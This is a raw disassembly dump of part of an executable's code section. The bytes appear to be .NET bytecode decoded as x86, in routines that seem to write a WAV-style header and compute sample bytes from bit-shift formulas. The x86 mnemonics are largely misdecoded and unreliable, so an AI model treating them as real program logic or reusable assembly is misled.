  403ac8:	06                   	push   %es
  403ac9:	5a                   	pop    %edx
  403aca:	8d 42 00             	lea    0x0(%edx),%eax
  403acd:	00 01                	add    %al,(%ecx)
  403acf:	13 07                	adc    (%edi),%eax
  403ad1:	1c 8d                	sbb    $0x8d,%al
  403ad3:	48                   	dec    %eax
  403ad4:	00 00                	add    %al,(%eax)
  403ad6:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  403adc:	11 6f 70             	adc    %ebp,0x70(%edi)
  403adf:	00 00                	add    %al,(%eax)
  403ae1:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  403ae7:	1f                   	pop    %ds
  403ae8:	11 6f 70             	adc    %ebp,0x70(%edi)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  403af3:	20 00                	and    %al,(%eax)
  403af5:	20 00                	and    %al,(%eax)
  403af7:	00 6f 70             	add    %ch,0x70(%edi)
  403afa:	00 00                	add    %al,(%eax)
  403afc:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  403b02:	1f                   	pop    %ds
  403b03:	11 6f 70             	adc    %ebp,0x70(%edi)
  403b06:	00 00                	add    %al,(%eax)
  403b08:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  403b0e:	1f                   	pop    %ds
  403b0f:	11 6f 70             	adc    %ebp,0x70(%edi)
  403b12:	00 00                	add    %al,(%eax)
  403b14:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  403b1a:	1f                   	pop    %ds
  403b1b:	11 6f 70             	adc    %ebp,0x70(%edi)
  403b1e:	00 00                	add    %al,(%eax)
  403b20:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  403b26:	09 2b                	or     %ebp,(%ebx)
  403b28:	37                   	aaa
  403b29:	11 07                	adc    %eax,(%edi)
  403b2b:	11 09                	adc    %ecx,(%ecx)
  403b2d:	11 09                	adc    %ecx,(%ecx)
  403b2f:	11 09                	adc    %ecx,(%ecx)
  403b31:	11 09                	adc    %ecx,(%ecx)
  403b33:	11 09                	adc    %ecx,(%ecx)
  403b35:	11 08                	adc    %ecx,(%eax)
  403b37:	16                   	push   %ss
  403b38:	94                   	xchg   %eax,%esp
  403b39:	1f                   	pop    %ds
  403b3a:	1f                   	pop    %ds
  403b3b:	5f                   	pop    %edi
  403b3c:	63 11                	arpl   %edx,(%ecx)
  403b3e:	08 17                	or     %dl,(%edi)
  403b40:	94                   	xchg   %eax,%esp
  403b41:	60                   	pusha
  403b42:	58                   	pop    %eax
  403b43:	61                   	popa
  403b44:	11 09                	adc    %ecx,(%ecx)
  403b46:	11 08                	adc    %ecx,(%eax)
  403b48:	18 94 59 11 09 61 11 	sbb    %dl,0x11610911(%ecx,%ebx,2)
  403b4f:	08 19                	or     %bl,(%ecx)
  403b51:	94                   	xchg   %eax,%esp
  403b52:	1f                   	pop    %ds
  403b53:	1f                   	pop    %ds
  403b54:	5f                   	pop    %edi
  403b55:	63 61 5a             	arpl   %esp,0x5a(%ecx)
  403b58:	d2 9c 11 09 17 58 13 	rcrb   %cl,0x13581709(%ecx,%edx,1)
  403b5f:	09 11                	or     %edx,(%ecx)
  403b61:	09 11                	or     %edx,(%ecx)
  403b63:	07                   	pop    %es
  403b64:	8e 69 32             	mov    0x32(%ecx),%gs
  403b67:	c1 08 11             	rorl   $0x11,(%eax)
  403b6a:	07                   	pop    %es
  403b6b:	8e 69 09             	mov    0x9(%ecx),%gs
  403b6e:	5a                   	pop    %edx
  403b6f:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403b75:	7a 00                	jp     0x403b77
  403b77:	00 0a                	add    %cl,(%edx)
  403b79:	11 07                	adc    %eax,(%edi)
  403b7b:	13 0a                	adc    (%edx),%ecx
  403b7d:	16                   	push   %ss
  403b7e:	13 0b                	adc    (%ebx),%ecx
  403b80:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  403b86:	91                   	xchg   %eax,%ecx
  403b87:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  403b8a:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  403b8d:	7c 00                	jl     0x403b8f
  403b8f:	00 0a                	add    %cl,(%edx)
  403b91:	11 0b                	adc    %ecx,(%ebx)
  403b93:	17                   	pop    %ss
  403b94:	58                   	pop    %eax
  403b95:	13 0b                	adc    (%ebx),%ecx
  403b97:	11 0b                	adc    %ecx,(%ebx)
  403b99:	11 0a                	adc    %ecx,(%edx)
  403b9b:	8e 69 32             	mov    0x32(%ecx),%gs
  403b9e:	e3 08                	jecxz  0x403ba8
  403ba0:	1a 16                	sbb    (%esi),%dl
  403ba2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ba3:	7d 00                	jge    0x403ba5
  403ba5:	00 0a                	add    %cl,(%edx)
  403ba7:	26 08 08             	or     %cl,%es:(%eax)
  403baa:	6f                   	outsl  %ds:(%esi),(%dx)
  403bab:	7e 00                	jle    0x403bad
  403bad:	00 0a                	add    %cl,(%edx)
  403baf:	6f                   	outsl  %ds:(%esi),(%dx)
  403bb0:	7f 00                	jg     0x403bb2
  403bb2:	00 0a                	add    %cl,(%edx)
  403bb4:	1e                   	push   %ds
  403bb5:	6a 59                	push   $0x59
  403bb7:	6d                   	insl   (%dx),%es:(%edi)
  403bb8:	6f                   	outsl  %ds:(%esi),(%dx)
  403bb9:	7a 00                	jp     0x403bbb
  403bbb:	00 0a                	add    %cl,(%edx)
  403bbd:	07                   	pop    %es
  403bbe:	16                   	push   %ss
  403bbf:	6a 16                	push   $0x16
  403bc1:	6f                   	outsl  %ds:(%esi),(%dx)
  403bc2:	80 00 00             	addb   $0x0,(%eax)
  403bc5:	0a 26                	or     (%esi),%ah
  403bc7:	07                   	pop    %es
  403bc8:	73 81                	jae    0x403b4b
  403bca:	00 00                	add    %al,(%eax)
  403bcc:	0a 28                	or     (%eax),%ch
  403bce:	82 00 00             	addb   $0x0,(%eax)
  403bd1:	0a de                	or     %dh,%bl
  403bd3:	0a 07                	or     (%edi),%al
  403bd5:	2c 06                	sub    $0x6,%al
  403bd7:	07                   	pop    %es
  403bd8:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd9:	55                   	push   %ebp
  403bda:	00 00                	add    %al,(%eax)
  403bdc:	0a dc                	or     %ah,%bl
  403bde:	2a 00                	sub    (%eax),%al
  403be0:	41                   	inc    %ecx
  403be1:	1c 00                	sbb    $0x0,%al
  403be3:	00 02                	add    %al,(%edx)
  403be5:	00 00                	add    %al,(%eax)
  403be7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	ac                   	lods   %ds:(%esi),%al
  403bed:	01 00                	add    %eax,(%eax)
  403bef:	00 b8 01 00 00 0a    	add    %bh,0xa000001(%eax)
  403bf5:	00 00                	add    %al,(%eax)
  403bf7:	00 00                	add    %al,(%eax)
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 1b                	add    %bl,(%ebx)
  403bfd:	30 06                	xor    %al,(%esi)
  403bff:	00 b7 01 00 00 10    	add    %dh,0x10000001(%edi)
  403c05:	00 00                	add    %al,(%eax)
  403c07:	11 73 53             	adc    %esi,0x53(%ebx)
  403c0a:	00 00                	add    %al,(%eax)
  403c0c:	0a 0a                	or     (%edx),%cl
  403c0e:	73 76                	jae    0x403c86
  403c10:	00 00                	add    %al,(%eax)
  403c12:	0a 0b                	or     (%ebx),%cl
  403c14:	07                   	pop    %es
  403c15:	73 77                	jae    0x403c8e
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403c1c:	72 cb                	jb     0x403be9
  403c1e:	04 00                	add    $0x0,%al
  403c20:	70 28                	jo     0x403c4a
  403c22:	78 00                	js     0x403c24
  403c24:	00 0a                	add    %cl,(%edx)
  403c26:	6f                   	outsl  %ds:(%esi),(%dx)
  403c27:	79 00                	jns    0x403c29
  403c29:	00 0a                	add    %cl,(%edx)
  403c2b:	08 16                	or     %dl,(%esi)
  403c2d:	6f                   	outsl  %ds:(%esi),(%dx)
  403c2e:	7a 00                	jp     0x403c30
  403c30:	00 0a                	add    %cl,(%edx)
  403c32:	08 72 d5             	or     %dh,-0x2b(%edx)
  403c35:	04 00                	add    $0x0,%al
  403c37:	70 28                	jo     0x403c61
  403c39:	78 00                	js     0x403c3b
  403c3b:	00 0a                	add    %cl,(%edx)
  403c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  403c3e:	79 00                	jns    0x403c40
  403c40:	00 0a                	add    %cl,(%edx)
  403c42:	08 72 df             	or     %dh,-0x21(%edx)
  403c45:	04 00                	add    $0x0,%al
  403c47:	70 28                	jo     0x403c71
  403c49:	78 00                	js     0x403c4b
  403c4b:	00 0a                	add    %cl,(%edx)
  403c4d:	6f                   	outsl  %ds:(%esi),(%dx)
  403c4e:	79 00                	jns    0x403c50
  403c50:	00 0a                	add    %cl,(%edx)
  403c52:	08 1f                	or     %bl,(%edi)
  403c54:	10 6f 7a             	adc    %ch,0x7a(%edi)
  403c57:	00 00                	add    %al,(%eax)
  403c59:	0a 08                	or     (%eax),%cl
  403c5b:	17                   	pop    %ss
  403c5c:	6f                   	outsl  %ds:(%esi),(%dx)
  403c5d:	7b 00                	jnp    0x403c5f
  403c5f:	00 0a                	add    %cl,(%edx)
  403c61:	17                   	pop    %ss
  403c62:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  403c67:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  403c6d:	7b 00                	jnp    0x403c6f
  403c6f:	00 0a                	add    %cl,(%edx)
  403c71:	08 11                	or     %dl,(%ecx)
  403c73:	04 6f                	add    $0x6f,%al
  403c75:	7a 00                	jp     0x403c77
  403c77:	00 0a                	add    %cl,(%edx)
  403c79:	08 11                	or     %dl,(%ecx)
  403c7b:	04 09                	add    $0x9,%al
  403c7d:	5a                   	pop    %edx
  403c7e:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403c84:	7a 00                	jp     0x403c86
  403c86:	00 0a                	add    %cl,(%edx)
  403c88:	08 09                	or     %cl,(%ecx)
  403c8a:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  403c90:	6f                   	outsl  %ds:(%esi),(%dx)
  403c91:	7b 00                	jnp    0x403c93
  403c93:	00 0a                	add    %cl,(%edx)
  403c95:	08 11                	or     %dl,(%ecx)
  403c97:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  403c9c:	00 0a                	add    %cl,(%edx)
  403c9e:	08 72 e9             	or     %dh,-0x17(%edx)
  403ca1:	04 00                	add    $0x0,%al
  403ca3:	70 28                	jo     0x403ccd
  403ca5:	78 00                	js     0x403ca7
  403ca7:	00 0a                	add    %cl,(%edx)
  403ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  403caa:	79 00                	jns    0x403cac
  403cac:	00 0a                	add    %cl,(%edx)
  403cae:	03 13                	add    (%ebx),%edx
  403cb0:	06                   	push   %es
  403cb1:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403cb4:	06                   	push   %es
  403cb5:	5a                   	pop    %edx
  403cb6:	8d 42 00             	lea    0x0(%edx),%eax
  403cb9:	00 01                	add    %al,(%ecx)
  403cbb:	13 07                	adc    (%edi),%eax
  403cbd:	1c 8d                	sbb    $0x8d,%al
  403cbf:	48                   	dec    %eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  403cc8:	11 6f 70             	adc    %ebp,0x70(%edi)
  403ccb:	00 00                	add    %al,(%eax)
  403ccd:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  403cd3:	1f                   	pop    %ds
  403cd4:	11 6f 70             	adc    %ebp,0x70(%edi)
  403cd7:	00 00                	add    %al,(%eax)
  403cd9:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  403cdf:	1f                   	pop    %ds
  403ce0:	11 6f 70             	adc    %ebp,0x70(%edi)
  403ce3:	00 00                	add    %al,(%eax)
  403ce5:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  403ceb:	1f                   	pop    %ds
  403cec:	11 6f 70             	adc    %ebp,0x70(%edi)
  403cef:	00 00                	add    %al,(%eax)
  403cf1:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  403cf7:	1f                   	pop    %ds
  403cf8:	11 6f 70             	adc    %ebp,0x70(%edi)
  403cfb:	00 00                	add    %al,(%eax)
  403cfd:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  403d03:	1f                   	pop    %ds
  403d04:	11 6f 70             	adc    %ebp,0x70(%edi)
  403d07:	00 00                	add    %al,(%eax)
  403d09:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  403d0f:	09 2b                	or     %ebp,(%ebx)
  403d11:	2e 11 07             	adc    %eax,%cs:(%edi)
  403d14:	11 09                	adc    %ecx,(%ecx)
  403d16:	11 09                	adc    %ecx,(%ecx)
  403d18:	11 08                	adc    %ecx,(%eax)
  403d1a:	16                   	push   %ss
  403d1b:	94                   	xchg   %eax,%esp
  403d1c:	1f                   	pop    %ds
  403d1d:	1f                   	pop    %ds
  403d1e:	5f                   	pop    %edi
  403d1f:	63 11                	arpl   %edx,(%ecx)
  403d21:	09 11                	or     %edx,(%ecx)
  403d23:	08 17                	or     %dl,(%edi)
  403d25:	94                   	xchg   %eax,%esp
  403d26:	1f                   	pop    %ds
  403d27:	1f                   	pop    %ds
  403d28:	5f                   	pop    %edi
  403d29:	63 11                	arpl   %edx,(%ecx)
  403d2b:	08 18                	or     %bl,(%eax)
  403d2d:	94                   	xchg   %eax,%esp
  403d2e:	59                   	pop    %ecx
  403d2f:	61                   	popa
  403d30:	11 08                	adc    %ecx,(%eax)
  403d32:	19 94 61 11 09 5a d2 	sbb    %edx,-0x2da5f6ef(%ecx,%eiz,2)
  403d39:	9c                   	pushf
  403d3a:	11 09                	adc    %ecx,(%ecx)
  403d3c:	17                   	pop    %ss
  403d3d:	58                   	pop    %eax
  403d3e:	13 09                	adc    (%ecx),%ecx
  403d40:	11 09                	adc    %ecx,(%ecx)
  403d42:	11 07                	adc    %eax,(%edi)
  403d44:	8e 69 32             	mov    0x32(%ecx),%gs
  403d47:	ca 08 11             	lret   $0x1108
  403d4a:	07                   	pop    %es
  403d4b:	8e 69 09             	mov    0x9(%ecx),%gs
  403d4e:	5a                   	pop    %edx
  403d4f:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403d55:	7a 00                	jp     0x403d57
  403d57:	00 0a                	add    %cl,(%edx)
  403d59:	11 07                	adc    %eax,(%edi)
  403d5b:	13 0a                	adc    (%edx),%ecx
  403d5d:	16                   	push   %ss
  403d5e:	13 0b                	adc    (%ebx),%ecx
  403d60:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  403d66:	91                   	xchg   %eax,%ecx
  403d67:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  403d6a:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  403d6d:	7c 00                	jl     0x403d6f
  403d6f:	00 0a                	add    %cl,(%edx)
  403d71:	11 0b                	adc    %ecx,(%ebx)
  403d73:	17                   	pop    %ss
  403d74:	58                   	pop    %eax
  403d75:	13 0b                	adc    (%ebx),%ecx
  403d77:	11 0b                	adc    %ecx,(%ebx)
  403d79:	11 0a                	adc    %ecx,(%edx)
  403d7b:	8e 69 32             	mov    0x32(%ecx),%gs
  403d7e:	e3 08                	jecxz  0x403d88
  403d80:	1a 16                	sbb    (%esi),%dl
  403d82:	6f                   	outsl  %ds:(%esi),(%dx)
  403d83:	7d 00                	jge    0x403d85
  403d85:	00 0a                	add    %cl,(%edx)
  403d87:	26 08 08             	or     %cl,%es:(%eax)
  403d8a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d8b:	7e 00                	jle    0x403d8d
  403d8d:	00 0a                	add    %cl,(%edx)
  403d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  403d90:	7f 00                	jg     0x403d92
  403d92:	00 0a                	add    %cl,(%edx)
  403d94:	1e                   	push   %ds
  403d95:	6a 59                	push   $0x59
  403d97:	6d                   	insl   (%dx),%es:(%edi)
  403d98:	6f                   	outsl  %ds:(%esi),(%dx)
  403d99:	7a 00                	jp     0x403d9b
  403d9b:	00 0a                	add    %cl,(%edx)
  403d9d:	07                   	pop    %es
  403d9e:	16                   	push   %ss
  403d9f:	6a 16                	push   $0x16
  403da1:	6f                   	outsl  %ds:(%esi),(%dx)
  403da2:	80 00 00             	addb   $0x0,(%eax)
  403da5:	0a 26                	or     (%esi),%ah
  403da7:	07                   	pop    %es
  403da8:	73 81                	jae    0x403d2b
  403daa:	00 00                	add    %al,(%eax)
  403dac:	0a 28                	or     (%eax),%ch
  403dae:	82 00 00             	addb   $0x0,(%eax)
  403db1:	0a de                	or     %dh,%bl
  403db3:	0a 07                	or     (%edi),%al
  403db5:	2c 06                	sub    $0x6,%al
  403db7:	07                   	pop    %es
  403db8:	6f                   	outsl  %ds:(%esi),(%dx)
  403db9:	55                   	push   %ebp
  403dba:	00 00                	add    %al,(%eax)
  403dbc:	0a dc                	or     %ah,%bl
  403dbe:	2a 00                	sub    (%eax),%al
  403dc0:	41                   	inc    %ecx
  403dc1:	1c 00                	sbb    $0x0,%al
  403dc3:	00 02                	add    %al,(%edx)
  403dc5:	00 00                	add    %al,(%eax)
  403dc7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403dca:	00 00                	add    %al,(%eax)
  403dcc:	a0 01 00 00 ac       	mov    0xac000001,%al
  403dd1:	01 00                	add    %eax,(%eax)
  403dd3:	00 0a                	add    %cl,(%edx)
  403dd5:	00 00                	add    %al,(%eax)
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	00 00                	add    %al,(%eax)
  403ddb:	00 1b                	add    %bl,(%ebx)
  403ddd:	30 06                	xor    %al,(%esi)
  403ddf:	00 ad 01 00 00 10    	add    %ch,0x10000001(%ebp)
  403de5:	00 00                	add    %al,(%eax)
  403de7:	11 73 53             	adc    %esi,0x53(%ebx)
  403dea:	00 00                	add    %al,(%eax)
  403dec:	0a 0a                	or     (%edx),%cl
  403dee:	73 76                	jae    0x403e66
  403df0:	00 00                	add    %al,(%eax)
  403df2:	0a 0b                	or     (%ebx),%cl
  403df4:	07                   	pop    %es
  403df5:	73 77                	jae    0x403e6e
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403dfc:	72 cb                	jb     0x403dc9
  403dfe:	04 00                	add    $0x0,%al
  403e00:	70 28                	jo     0x403e2a
  403e02:	78 00                	js     0x403e04
  403e04:	00 0a                	add    %cl,(%edx)
  403e06:	6f                   	outsl  %ds:(%esi),(%dx)
  403e07:	79 00                	jns    0x403e09
  403e09:	00 0a                	add    %cl,(%edx)
  403e0b:	08 16                	or     %dl,(%esi)
  403e0d:	6f                   	outsl  %ds:(%esi),(%dx)
  403e0e:	7a 00                	jp     0x403e10
  403e10:	00 0a                	add    %cl,(%edx)
  403e12:	08 72 d5             	or     %dh,-0x2b(%edx)
  403e15:	04 00                	add    $0x0,%al
  403e17:	70 28                	jo     0x403e41
  403e19:	78 00                	js     0x403e1b
  403e1b:	00 0a                	add    %cl,(%edx)
  403e1d:	6f                   	outsl  %ds:(%esi),(%dx)
  403e1e:	79 00                	jns    0x403e20
  403e20:	00 0a                	add    %cl,(%edx)
  403e22:	08 72 df             	or     %dh,-0x21(%edx)
  403e25:	04 00                	add    $0x0,%al
  403e27:	70 28                	jo     0x403e51
  403e29:	78 00                	js     0x403e2b
  403e2b:	00 0a                	add    %cl,(%edx)
  403e2d:	6f                   	outsl  %ds:(%esi),(%dx)
  403e2e:	79 00                	jns    0x403e30
  403e30:	00 0a                	add    %cl,(%edx)
  403e32:	08 1f                	or     %bl,(%edi)
  403e34:	10 6f 7a             	adc    %ch,0x7a(%edi)
  403e37:	00 00                	add    %al,(%eax)
  403e39:	0a 08                	or     (%eax),%cl
  403e3b:	17                   	pop    %ss
  403e3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3d:	7b 00                	jnp    0x403e3f
  403e3f:	00 0a                	add    %cl,(%edx)
  403e41:	17                   	pop    %ss
  403e42:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  403e47:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  403e4d:	7b 00                	jnp    0x403e4f
  403e4f:	00 0a                	add    %cl,(%edx)
  403e51:	08 11                	or     %dl,(%ecx)
  403e53:	04 6f                	add    $0x6f,%al
  403e55:	7a 00                	jp     0x403e57
  403e57:	00 0a                	add    %cl,(%edx)
  403e59:	08 11                	or     %dl,(%ecx)
  403e5b:	04 09                	add    $0x9,%al
  403e5d:	5a                   	pop    %edx
  403e5e:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403e64:	7a 00                	jp     0x403e66
  403e66:	00 0a                	add    %cl,(%edx)
  403e68:	08 09                	or     %cl,(%ecx)
  403e6a:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	7b 00                	jnp    0x403e73
  403e73:	00 0a                	add    %cl,(%edx)
  403e75:	08 11                	or     %dl,(%ecx)
  403e77:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  403e7c:	00 0a                	add    %cl,(%edx)
  403e7e:	08 72 e9             	or     %dh,-0x17(%edx)
  403e81:	04 00                	add    $0x0,%al
  403e83:	70 28                	jo     0x403ead
  403e85:	78 00                	js     0x403e87
  403e87:	00 0a                	add    %cl,(%edx)
  403e89:	6f                   	outsl  %ds:(%esi),(%dx)
  403e8a:	79 00                	jns    0x403e8c
  403e8c:	00 0a                	add    %cl,(%edx)
  403e8e:	03 13                	add    (%ebx),%edx
  403e90:	06                   	push   %es
  403e91:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403e94:	06                   	push   %es
  403e95:	5a                   	pop    %edx
  403e96:	8d 42 00             	lea    0x0(%edx),%eax
  403e99:	00 01                	add    %al,(%ecx)
  403e9b:	13 07                	adc    (%edi),%eax
  403e9d:	1c 8d                	sbb    $0x8d,%al
  403e9f:	48                   	dec    %eax
  403ea0:	00 00                	add    %al,(%eax)
  403ea2:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  403ea8:	11 6f 70             	adc    %ebp,0x70(%edi)
  403eab:	00 00                	add    %al,(%eax)
  403ead:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  403eb3:	1f                   	pop    %ds
  403eb4:	11 6f 70             	adc    %ebp,0x70(%edi)
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  403ebf:	1f                   	pop    %ds
  403ec0:	11 6f 70             	adc    %ebp,0x70(%edi)
  403ec3:	00 00                	add    %al,(%eax)
  403ec5:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  403ecb:	1f                   	pop    %ds
  403ecc:	11 6f 70             	adc    %ebp,0x70(%edi)
  403ecf:	00 00                	add    %al,(%eax)
  403ed1:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  403ed7:	1f                   	pop    %ds
  403ed8:	11 6f 70             	adc    %ebp,0x70(%edi)
  403edb:	00 00                	add    %al,(%eax)
  403edd:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  403ee3:	1f                   	pop    %ds
  403ee4:	11 6f 70             	adc    %ebp,0x70(%edi)
  403ee7:	00 00                	add    %al,(%eax)
  403ee9:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  403eef:	09 2b                	or     %ebp,(%ebx)
  403ef1:	24 11                	and    $0x11,%al
  403ef3:	07                   	pop    %es
  403ef4:	11 09                	adc    %ecx,(%ecx)
  403ef6:	11 09                	adc    %ecx,(%ecx)
  403ef8:	11 09                	adc    %ecx,(%ecx)
  403efa:	11 08                	adc    %ecx,(%eax)
  403efc:	16                   	push   %ss
  403efd:	94                   	xchg   %eax,%esp
  403efe:	1f                   	pop    %ds
  403eff:	1f                   	pop    %ds
  403f00:	5f                   	pop    %edi
  403f01:	63 61 11             	arpl   %esp,0x11(%ecx)
  403f04:	09 5a 11             	or     %ebx,0x11(%edx)
  403f07:	08 17                	or     %dl,(%edi)
  403f09:	94                   	xchg   %eax,%esp
  403f0a:	1f                   	pop    %ds
  403f0b:	1f                   	pop    %ds
  403f0c:	5f                   	pop    %edi
  403f0d:	63 d2                	arpl   %edx,%edx
  403f0f:	9c                   	pushf
  403f10:	11 09                	adc    %ecx,(%ecx)
  403f12:	17                   	pop    %ss
  403f13:	58                   	pop    %eax
  403f14:	13 09                	adc    (%ecx),%ecx
  403f16:	11 09                	adc    %ecx,(%ecx)
  403f18:	11 07                	adc    %eax,(%edi)
  403f1a:	8e 69 32             	mov    0x32(%ecx),%gs
  403f1d:	d4 08                	aam    $0x8
  403f1f:	11 07                	adc    %eax,(%edi)
  403f21:	8e 69 09             	mov    0x9(%ecx),%gs
  403f24:	5a                   	pop    %edx
  403f25:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403f2b:	7a 00                	jp     0x403f2d
  403f2d:	00 0a                	add    %cl,(%edx)
  403f2f:	11 07                	adc    %eax,(%edi)
  403f31:	13 0a                	adc    (%edx),%ecx
  403f33:	16                   	push   %ss
  403f34:	13 0b                	adc    (%ebx),%ecx
  403f36:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  403f3c:	91                   	xchg   %eax,%ecx
  403f3d:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  403f40:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  403f43:	7c 00                	jl     0x403f45
  403f45:	00 0a                	add    %cl,(%edx)
  403f47:	11 0b                	adc    %ecx,(%ebx)
  403f49:	17                   	pop    %ss
  403f4a:	58                   	pop    %eax
  403f4b:	13 0b                	adc    (%ebx),%ecx
  403f4d:	11 0b                	adc    %ecx,(%ebx)
  403f4f:	11 0a                	adc    %ecx,(%edx)
  403f51:	8e 69 32             	mov    0x32(%ecx),%gs
  403f54:	e3 08                	jecxz  0x403f5e
  403f56:	1a 16                	sbb    (%esi),%dl
  403f58:	6f                   	outsl  %ds:(%esi),(%dx)
  403f59:	7d 00                	jge    0x403f5b
  403f5b:	00 0a                	add    %cl,(%edx)
  403f5d:	26 08 08             	or     %cl,%es:(%eax)
  403f60:	6f                   	outsl  %ds:(%esi),(%dx)
  403f61:	7e 00                	jle    0x403f63
  403f63:	00 0a                	add    %cl,(%edx)
  403f65:	6f                   	outsl  %ds:(%esi),(%dx)
  403f66:	7f 00                	jg     0x403f68
  403f68:	00 0a                	add    %cl,(%edx)
  403f6a:	1e                   	push   %ds
  403f6b:	6a 59                	push   $0x59
  403f6d:	6d                   	insl   (%dx),%es:(%edi)
  403f6e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6f:	7a 00                	jp     0x403f71
  403f71:	00 0a                	add    %cl,(%edx)
  403f73:	07                   	pop    %es
  403f74:	16                   	push   %ss
  403f75:	6a 16                	push   $0x16
  403f77:	6f                   	outsl  %ds:(%esi),(%dx)
  403f78:	80 00 00             	addb   $0x0,(%eax)
  403f7b:	0a 26                	or     (%esi),%ah
  403f7d:	07                   	pop    %es
  403f7e:	73 81                	jae    0x403f01
  403f80:	00 00                	add    %al,(%eax)
  403f82:	0a 28                	or     (%eax),%ch
  403f84:	82 00 00             	addb   $0x0,(%eax)
  403f87:	0a de                	or     %dh,%bl
  403f89:	0a 07                	or     (%edi),%al
  403f8b:	2c 06                	sub    $0x6,%al
  403f8d:	07                   	pop    %es
  403f8e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f8f:	55                   	push   %ebp
  403f90:	00 00                	add    %al,(%eax)
  403f92:	0a dc                	or     %ah,%bl
  403f94:	2a 00                	sub    (%eax),%al
  403f96:	00 00                	add    %al,(%eax)
  403f98:	41                   	inc    %ecx
  403f99:	1c 00                	sbb    $0x0,%al
  403f9b:	00 02                	add    %al,(%edx)
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	96                   	xchg   %eax,%esi
  403fa5:	01 00                	add    %eax,(%eax)
  403fa7:	00 a2 01 00 00 0a    	add    %ah,0xa000001(%edx)
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 00                	add    %al,(%eax)
  403fb1:	00 00                	add    %al,(%eax)
  403fb3:	00 1b                	add    %bl,(%ebx)
  403fb5:	30 07                	xor    %al,(%edi)
  403fb7:	00 c3                	add    %al,%bl
  403fb9:	01 00                	add    %eax,(%eax)
  403fbb:	00 10                	add    %dl,(%eax)
  403fbd:	00 00                	add    %al,(%eax)
  403fbf:	11 73 53             	adc    %esi,0x53(%ebx)
  403fc2:	00 00                	add    %al,(%eax)
  403fc4:	0a 0a                	or     (%edx),%cl
  403fc6:	73 76                	jae    0x40403e
  403fc8:	00 00                	add    %al,(%eax)
  403fca:	0a 0b                	or     (%ebx),%cl
  403fcc:	07                   	pop    %es
  403fcd:	73 77                	jae    0x404046
  403fcf:	00 00                	add    %al,(%eax)
  403fd1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403fd4:	72 cb                	jb     0x403fa1
  403fd6:	04 00                	add    $0x0,%al
  403fd8:	70 28                	jo     0x404002
  403fda:	78 00                	js     0x403fdc
  403fdc:	00 0a                	add    %cl,(%edx)
  403fde:	6f                   	outsl  %ds:(%esi),(%dx)
  403fdf:	79 00                	jns    0x403fe1
